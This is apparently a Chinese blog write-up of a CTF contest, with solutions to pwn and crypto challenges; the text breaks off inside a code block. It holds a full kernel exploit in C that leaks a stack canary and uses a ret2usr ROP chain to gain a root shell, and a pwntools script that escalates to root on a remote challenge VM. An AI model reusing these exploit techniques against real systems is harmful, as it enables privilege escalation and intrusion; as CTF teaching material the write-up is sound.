    <content type="html"><![CDATA[<p>最近打的一场CTF，题目比较友好。有空了把剩下没做出来的pwn题复现一下，或者学一下reverse(又预见了🕊)</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="welcome-CAT-CTF"><a href="#welcome-CAT-CTF" class="headerlink" title="welcome_CAT_CTF"></a>welcome_CAT_CTF</h2><p>用IDA给patch一下client程序逻辑然后运行即可</p><h2 id="kernel-test"><a href="#kernel-test" class="headerlink" title="kernel-test"></a>kernel-test</h2><p>内核栈溢出，先read泄露canary然后write写ROP到pwn上最后ioctl调用即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff8107a4d4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8103b82b</span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss,ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Status has been saved.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootPrivilige</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="keyword">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*commit_creds_ptr)(<span class="keyword">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to get the root!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]Successful to get the root. Execve root shell now...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/test&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /dev/test !\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> offset = commit_creds<span class="number">-0xffffffff810ccc30</span>;</span><br><span class="line">    <span class="comment">/*找出canary*/</span></span><br><span class="line">    read(fd,tmp,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">size_t</span> canary = *(<span class="keyword">size_t</span>*)tmp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] canary find: %llx&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>)canary);</span><br><span class="line">    <span class="comment">/*构造ROP链ret2usr*/</span></span><br><span class="line">    <span class="keyword">size_t</span> rop_chain[<span class="number">0x100</span>],i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line">    rop_chain[i++] = (<span class="keyword">size_t</span>)getRootPrivilige;</span><br><span class="line">    rop_chain[i++] = SWAPGS_POP_RBP_RET + offset;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = IRETQ + offset;</span><br><span class="line">    rop_chain[i++] = (<span class="keyword">size_t</span>)getRootShell;</span><br><span class="line">    rop_chain[i++] = user_cs;</span><br><span class="line">    rop_chain[i++] = user_rflags;</span><br><span class="line">    rop_chain[i++] = user_sp;</span><br><span class="line">    rop_chain[i++] = user_ss;</span><br><span class="line">    write(fd,rop_chain,<span class="number">0x100</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次实战做kernel题，原来打远程那么恶心和麻烦，搞了半天（</p><h2 id="vmbyhrp"><a href="#vmbyhrp" class="headerlink" title="vmbyhrp"></a>vmbyhrp</h2><p>思路是进root然后读入flag，退出root然后输出flag。</p><p>首先是进root，需要覆盖掉bss上面的变量users和group。这里的思路是用HRP_OPEN这个函数。首先创建32个文件，对于这些文件的相关描述是放在bss上面的，所以会溢出到users和group，由该文件的输出权限的变量覆盖，通过HRP_OPEN修改相应文件的权限即可把user和group变为0</p><p><img src="https://s2.loli.net/2023/01/02/ykVt4IE5LCdO982.png" alt=""></p><p>进root之后读入flag创建为一个文件，然后退出root。不过这里有个问题是相应管理文件名的变量会被置为0(原因是执行了<code>strncpy(dest, src, 8uLL);</code>，而这个全局变量dest正好是某个FIle存其File Name指针的地方)导致运行命令循环查找文件名时候引用一个0地址处的值出现异常</p><p><img src="https://s2.loli.net/2023/01/02/1vLFw3bpqaTtgKc.png" alt=""></p><p>而这个地方恰好是login的时候输入的HOLDER的值，所以这里的想法是先mmap一块合法地址，然后reboot把合法地址填入相应地址，防止查找文件名出现错误</p><p>最后用相同的思路把flag文件的权限改一改然后cat输出即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./HRPVM&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;223.112.5.156&quot;</span>,<span class="number">58203</span>)</span><br><span class="line"><span class="comment">#context.log_level=&quot;INFO&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    name = <span class="string">&quot;HRPHRP&quot;</span></span><br><span class="line">    passwd = <span class="string">&quot;PWNME&quot;</span></span><br><span class="line">    <span class="comment">#io.recvuntil(&quot;USER NAME:&quot;)</span></span><br><span class="line">    io.sendline(name)</span><br><span class="line">    <span class="comment">#io.recvuntil(&quot;PASSWORD:&quot;)</span></span><br><span class="line">    io.sendline(passwd)</span><br><span class="line">    <span class="comment">#io.recvuntil(&quot;[+]HOLDER:&quot;)</span></span><br><span class="line">    io.sendline(p64(<span class="number">0x333333333000</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_file</span>(<span class="params">file_name,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;FILE NAME: &quot;</span>,file_name)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;FILE CONTENT: &quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;./&quot;</span>+file_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;cat &#x27;</span>+file_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    io.sendline(<span class="string">&quot;rm &quot;</span>+file_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span>():</span></span><br><span class="line">    code = <span class="string">b&#x27;mov rdi,35;mov rsi,0;call open,2&#x27;</span></span><br><span class="line">    create_file(<span class="string">&quot;toroot&quot;</span>,code)</span><br><span class="line">    run(<span class="string">&quot;toroot&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_flag</span>():</span></span><br><span class="line">    io.sendline(<span class="string">&quot;file input&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;FILE NAME:&quot;</span>,<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap</span>(<span class="params">addr</span>):</span></span><br><span class="line">    io.sendline(<span class="string">&quot;mmap&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>)</span><br><span class="line">    io.sendline(str(addr))</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;mov rdi,37;mov rsi,1001;call open,2&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    create_file(str(i),payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">root()</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">load_flag()</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">mmap(<span class="number">0x333333333000</span>)</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;HRP-MACHINE$&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;reboot&quot;</span>)</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">login()</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment"># run(&quot;1&quot;)</span></span><br><span class="line"><span class="comment"># io.sendline(&quot;cat ./flag&quot;)</span></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>虽然已经结束了在Crypto的生涯，不过偶尔还是会看看然后恰点烂分(x)</p><h2 id="cat’s-gift"><a href="#cat’s-gift" class="headerlink" title="cat’s gift"></a>cat’s gift</h2><p>这个级数的结果是$ \frac{\pi}{4} $ ，所以答案是pie，包上即可</p><h2 id="cat-theory"><a href="#cat-theory" class="headerlink" title="cat_theory"></a>cat_theory</h2><p>考察同态性</p><script type="math/tex; mode=display">E(m_1+m_2) = c_1*c_2</script><p>所以</p><script type="math/tex; mode=display">m_1+m_2 = D(c_1*c_2)</script><p>三个加一块除以二即可</p><h2 id="盖茨比"><a href="#盖茨比" class="headerlink" title="盖茨比"></a>盖茨比</h2><p>可以解出</p><script type="math/tex; mode=display">xor(m_i,m_{i-1})</script><p>考虑到pad的格式，通过爆破可以知道最后一串明文是这样形式的’aaaaa\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b’，这样递推反着解密回去，可以解密每16个字符的后11个字符，然后通过前后文心灵感应猜出一串完整字符，解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> copy</span><br><span class="line">table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ,&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;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&#x27;</span></span><br><span class="line"></span><br><span class="line">key = b64decode(key)</span><br><span class="line">c = b64decode(c)</span><br><span class="line"><span class="comment">#print(len(c))</span></span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line">cipher = AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">xor_text = cipher.decrypt(c)</span><br><span class="line">s = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,len(c),<span class="number">16</span>):</span><br><span class="line">    s+= xor(xor_text[i:i+<span class="number">16</span>],c[i<span class="number">-16</span>:i])</span><br><span class="line">print(s[<span class="number">-16</span>:])</span><br><span class="line">x=<span class="string">b&#x27;aaaaa\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br><span class="line">msg = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">this_s = <span class="string">b&#x27;\nBut a human bra&#x27;</span></span><br><span class="line">msg = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">16</span>):</span><br><span class="line">    <span class="comment">#print(s[i:i+16])</span></span><br><span class="line">    this_s = xor(s[i:i+<span class="number">16</span>],this_s)</span><br><span class="line">    msg+=this_s</span><br><span class="line">print(msg)</span><br></pre></td></tr></table></figure><h2 id="DDH-GAME"><a href="#DDH-GAME" class="headerlink" title="DDH_GAME"></a>DDH_GAME</h2><p>阶给了，把这个点的群转换成一个较小阶的群计算DLP即可。具体来说就是同乘一个因子</p><p>DLP的计算可以采用类似bsgs算法，不过我总感觉sage里面的dlp算法没有考虑阶给定的情况感觉很慢，这里偷懒就没用bsgs的思想而是直接爆破，时间勉强可以接受</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 